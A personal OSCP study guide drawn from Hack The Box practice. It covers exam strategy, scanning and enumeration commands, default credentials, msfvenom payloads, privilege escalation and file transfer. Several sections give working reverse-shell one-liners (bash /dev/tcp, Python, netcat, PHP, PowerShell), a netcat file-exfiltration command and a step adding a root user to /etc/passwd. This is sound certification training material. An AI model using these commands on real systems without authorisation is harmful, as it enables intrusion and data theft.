# OSCP Tips & Tricks

---

## 1. Exam Strategy

### Time Management
- You have **23 hours 45 minutes** — don't spend more than 2 hours stuck on any single machine
- Hit the AD chain first (40 points) — if you clear it, you only need 30 more from 3 standalones
- If AD is stuck, pivot to standalones and come back later
- Take breaks — eat, stretch, step away for 10 minutes every 2-3 hours
- Keep a timer running for each machine

### Metasploit — Use It Wisely
- You get Metasploit on **ONE machine only** — save it for the hardest standalone
- Practice every exploit manually first (msfvenom + nc) so you don't depend on it
- Once you pick a machine for Metasploit, you're locked in — choose carefully

### Documentation During the Exam
- Screenshot **every single step** as you go — don't wait until after
- Copy/paste every command and its output into your notes
- Screenshot the flag + `whoami` + `ipconfig`/`ifconfig` together
- Use a structured template from the start (CherryTree, Obsidian, or plain markdown)

---

## 2. Enumeration — The Most Important Phase

### Don't Skip Steps
- Run a quick scan first (`nmap -sV -Pn -T4`), then a full port scan in the background (`nmap -p- --min-rate 5000`)
- **Always check all ports** — boxes love hiding services on high ports
- Enumerate every service you find — don't tunnel vision on the first thing you see

### Web Enumeration Checklist
```bash
# Fingerprint
whatweb http://<IP>
curl -I http://<IP>

# Directory brute force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,asp,aspx,jsp

# Vuln scan
nikto -h http://<IP>

# Always check
# - /robots.txt
# - /sitemap.xml
# - Page source code (comments, hidden paths)
# - 401/403 error pages (Tomcat leaks creds here)
# - Version numbers → searchsploit immediately
```

### SMB Checklist
```bash
smbclient -L //<IP> -N
smbmap -H <IP>
nmap -p 445 --script smb-vuln* <IP>
nmap -p 445 --script smb-vuln-ms08-067 --script-args unsafe=1 <IP>  # needs unsafe=1
```

### FTP Checklist
```bash
ftp <IP>
# Try: anonymous:(blank)
# If in: ls -la, check for hidden files, cd into every directory
# FTP can expose entire filesystems (like Netmon)
```

### Always Try Default Creds
| Service | Creds to Try |
|---|---|
| Tomcat | `tomcat:tomcat`, `tomcat:s3cret`, `admin:admin` |
| PRTG | `prtgadmin:prtgadmin` |
| Request Tracker | `root:password` |
| phpMyAdmin | `root:(blank)`, `root:root` |
| WordPress | `admin:admin`, `admin:password` |
| SSH/FTP | `admin:admin`, `root:root`, `anonymous:(blank)` |

---

## 3. Getting a Shell

### Reverse Shell Troubleshooting
If your reverse shell doesn't connect back:
1. **Check your firewall first** — `sudo firewall-cmd --zone=trusted --add-interface=tun0` (Arch Linux)
2. **Verify your listener is running** on the correct port
3. **Try a different port** — some targets filter outbound ports; try 80, 443, 8080
4. **Try a different shell type** — if PowerShell fails, try cmd; if TCP fails, try HTTP
5. **Try a bind shell** instead of reverse

### Shell Upgrade (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Shell Upgrade (Windows)
```bash
# From meterpreter — migrate to a stable 64-bit process
ps
migrate <explorer.exe PID>
```

### msfvenom Cheat Sheet (No Metasploit Needed)
```bash
# Windows reverse shell (32-bit)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Windows reverse shell (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php

# ASP reverse shell (IIS)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx
```

### Catching Shells Without Metasploit
```bash
# Netcat listener
nc -lvnp 4444

# If nc doesn't have -e flag, use:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/f
```

---

## 4. Linux Privilege Escalation

### Quick Wins — Check These First
```bash
# 1. Sudo permissions (THIS IS THE FIRST THING YOU DO)
sudo -l

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 3. Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 4. Writable files in sensitive locations
find /etc -writable 2>/dev/null
ls -la /etc/passwd  # writable = instant root

# 5. Kernel version (last resort)
uname -a
cat /etc/os-release

# 6. Capabilities
getcap -r / 2>/dev/null

# 7. Running processes
ps aux | grep root

# 8. Internal services
netstat -tulnp
ss -tulnp
```

### SUID Abuse
- Found a SUID binary? Check [GTFOBins](https://gtfobins.github.io/)
- Common SUID wins: `nmap --interactive`, `find -exec`, `vim`, `python`, `bash -p`

### Sudo Abuse
- `sudo -l` shows `NOPASSWD: ALL`? → `sudo /bin/bash`
- Specific binary? → Check GTFOBins for the sudo section
- See the `sudo-privesc-cheatsheet.md` for full details

### Writable /etc/passwd
```bash
# Generate password hash
openssl passwd -1 hacked

# Add a root user
echo 'hacked:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su hacked
```

### Cron Job Abuse
- If a cron runs a script you can write to → replace it with a reverse shell
- If a cron runs with wildcard (`*`) → inject arguments via filenames
- Check file permissions on every script referenced in crontab

---

## 5. Windows Privilege Escalation

### Quick Wins
```cmd
:: 1. Who am I and what privileges do I have?
whoami
whoami /priv
whoami /groups
net user %username%

:: 2. System info (for kernel exploits)
systeminfo

:: 3. Check for other users
net user
net localgroup administrators

:: 4. Scheduled tasks
schtasks /query /fo LIST /v

:: 5. Running services
tasklist /svc
wmic service get name,displayname,pathname,startmode

:: 6. Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows"

:: 7. AlwaysInstallElevated (instant SYSTEM if both are 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: 8. Stored credentials
cmdkey /list

:: 9. Interesting files
dir /s /b C:\Users\*.txt C:\Users\*.ini C:\Users\*.cfg C:\Users\*.xml 2>nul
```

### Metasploit Privesc (When Allowed)
```bash
# Always run this first
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Common wins:
# - ms16_032 (Win 2012 R2, Win 8.1)
# - ms15_051 (Win 7/2008)
# - ms14_058 (Win 7/2008)
# - bypassuac_eventvwr (if user is in admins group)
```

### When Metasploit Module Fails
This happened on Optimum — the module runs but payload doesn't connect:
1. **Try a different LPORT** — port conflicts kill sessions
2. **Migrate to a 64-bit process** before running 64-bit exploits
3. **Download the raw PowerShell script** and run it manually
4. **Use the exploit to run a command** (copy flag) instead of spawning a shell
5. **Try a completely different exploit** from the suggester list

### Manual Kernel Exploit Workflow
```bash
# 1. Get systeminfo output
systeminfo

# 2. Use Windows Exploit Suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# 3. Find the compiled exploit (precompiled binaries)
# https://github.com/SecWiki/windows-kernel-exploits

# 4. Transfer to target
certutil -urlcache -f http://<IP>/exploit.exe C:\Users\Public\exploit.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/exploit.exe','C:\Users\Public\exploit.exe')"

# 5. Run it
C:\Users\Public\exploit.exe
```

---

## 6. File Transfer Techniques

### Linux → Windows
```bash
# From attacker: host files
python3 -m http.server 80

# On target (Windows): download
certutil -urlcache -f http://<IP>/file.exe C:\Users\Public\file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\Public\file.exe')"
powershell -c "IWR -Uri http://<IP>/file.exe -OutFile C:\Users\Public\file.exe"
```

### Linux → Linux
```bash
# Attacker hosts
python3 -m http.server 80

# Target downloads
wget http://<IP>/file
curl http://<IP>/file -o file
```

### From Target to Attacker
```bash
# Attacker listens
nc -lvnp 9001 > received_file

# Target sends
nc <attacker_IP> 9001 < /path/to/file
```

---

## 7. Password Attacks

### Hash Cracking
```bash
# Identify hash type
hashid '<hash>'
hash-identifier

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat (faster with GPU)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt # NTLM
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt # sha512crypt
```

### Common Tricks
- **Password reuse** is everywhere — WiFi password = SSH password (Wifinetic), backup password with year incremented (Netmon)
- **Config files** often have plaintext passwords — always grep for `password`, `passwd`, `pwd`, `credential`, `secret`
- **Old backups** have old passwords — try incrementing years (2018 → 2019 → 2020)

---

## 8. Mindset & Habits

### When You're Stuck
1. **Go back to enumeration** — you missed something, guaranteed
2. **Re-read your nmap output** — is there a port you ignored?
3. **Check version numbers** again — searchsploit everything
4. **Try default creds** on every login panel
5. **Read the page source** — comments often leak paths and creds
6. **Check for config backups** — `.bak`, `.old`, `.swp`, `.save`, `~`
7. **Try another attack vector entirely** — don't force one path

### Things That Will Burn You on OSCP
- **Not documenting as you go** — you WILL forget steps during the report phase
- **Relying on Metasploit** — you only get it once, practice manual exploitation
- **Skipping enumeration** — "I think I know the vuln" → spend 3 hours on the wrong path
- **Not trying simple things first** — default creds, anonymous access, weak passwords
- **Forgetting to check both flags** — some machines have flags in unexpected locations
- **Not upgrading your shell** — unstable shells lose your progress

### Build a Methodology
For every machine, follow the same steps:
1. **Full port scan** — find everything
2. **Service enumeration** — version numbers for everything
3. **Vulnerability research** — searchsploit + google every version
4. **Try default creds** — on every login
5. **Exploit** — try the simplest path first
6. **Enumerate from inside** — `sudo -l`, SUID, cron, processes
7. **Escalate** — GTFOBins, kernel exploits, misconfigs
8. **Document everything** — screenshots, commands, outputs

---

## 9. Useful One-Liners

### Linux Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/<IP>/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat (with -e)
nc -e /bin/bash <IP> 4444

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Windows Reverse Shells
```powershell
# PowerShell one-liner
powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('<IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

---

## 10. Lessons from HTB (Personal Notes)

| Machine | Lesson |
|---|---|
| Lame | When reverse shells fail, try command execution payloads — not every target can reach you |
| Legacy | XP is 32-bit — don't use 64-bit payloads. `--script-args unsafe=1` for intrusive nmap checks |
| Blue | Disable Windows Firewall + UAC remote restriction before psexec |
| Jerry | Always click Cancel on 401 pages — Tomcat leaks creds in error pages |
| Knife | When quotes break across interpreters, base64 encode everything |
| Netmon | Backup files have old passwords — increment the year |
| Keeper | Unicode passwords break CLI tools — use GUI alternatives |
| Wifinetic | `getcap` is essential — capabilities can grant root powers to normal binaries |
| Bashed | Check for non-standard directories, cron jobs executing writable scripts |
| Optimum | When Metasploit modules fail, download the raw script and run it manually |

---

> **The OSCP is not about knowing every exploit — it's about having a methodology and not giving up.**
